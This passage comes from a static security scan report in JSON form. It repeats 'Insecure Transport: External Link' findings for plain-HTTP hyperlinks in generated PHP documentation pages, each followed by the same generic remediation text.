            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4677/?engineType=SCA&issue=CC2F6ADAFB5497D03702C14E87375876"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4678",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Caching---Database.php.html on line 31 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4678/?engineType=SCA&issue=CC2F6ADAFB5497D03702C14E87375877"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4679",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Caching---Database.php.html on line 90 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4679/?engineType=SCA&issue=CC2F6ADAFB5497D03702C14E87375878"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4680",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Caching---Database.php.html on line 91 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4680/?engineType=SCA&issue=CC2F6ADAFB5497D03702C14E87375879"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4681",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Caching---Database.php.html on line 102 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4681/?engineType=SCA&issue=CC2F6ADAFB5497D03702C14E8737587A"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4589",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Caching---Factory.php.html on line 29 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4589/?engineType=SCA&issue=9072B1B5066DC6286745427559F2F4FB"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4590",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Caching---Factory.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4590/?engineType=SCA&issue=9072B1B5066DC6286745427559F2F4FC"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4591",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Caching---Factory.php.html on line 66 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4591/?engineType=SCA&issue=9072B1B5066DC6286745427559F2F4FD"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4669",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Caching---File.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4669/?engineType=SCA&issue=C7819689A3B57FE1F1266E4D815DDE7F"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4670",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Caching---File.php.html on line 31 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4670/?engineType=SCA&issue=C7819689A3B57FE1F1266E4D815DDE80"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4671",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Caching---File.php.html on line 90 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4671/?engineType=SCA&issue=C7819689A3B57FE1F1266E4D815DDE81"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4672",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Caching---File.php.html on line 91 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4672/?engineType=SCA&issue=C7819689A3B57FE1F1266E4D815DDE82"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4673",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Caching---File.php.html on line 102 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4673/?engineType=SCA&issue=C7819689A3B57FE1F1266E4D815DDE83"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4736",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Caching---Interface.php.html on line 29 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4736/?engineType=SCA&issue=F1A6C5686CF5CB6A36C628C3D276BA35"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4737",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Caching---Interface.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4737/?engineType=SCA&issue=F1A6C5686CF5CB6A36C628C3D276BA36"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4738",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Caching---Interface.php.html on line 66 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4738/?engineType=SCA&issue=F1A6C5686CF5CB6A36C628C3D276BA37"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4505",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Caching---Memcached.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4505/?engineType=SCA&issue=5D2D8326A7105BF8EB61125286DB20F7"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4506",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Caching---Memcached.php.html on line 31 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4506/?engineType=SCA&issue=5D2D8326A7105BF8EB61125286DB20F8"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4507",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Caching---Memcached.php.html on line 90 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4507/?engineType=SCA&issue=5D2D8326A7105BF8EB61125286DB20F9"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4508",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Caching---Memcached.php.html on line 91 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4508/?engineType=SCA&issue=5D2D8326A7105BF8EB61125286DB20FA"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4509",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Caching---Memcached.php.html on line 102 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4509/?engineType=SCA&issue=5D2D8326A7105BF8EB61125286DB20FB"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4609",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Caching---Session.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4609/?engineType=SCA&issue=9A0CF12233A5B440DCC7ADA201669E8F"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4610",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Caching---Session.php.html on line 31 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see 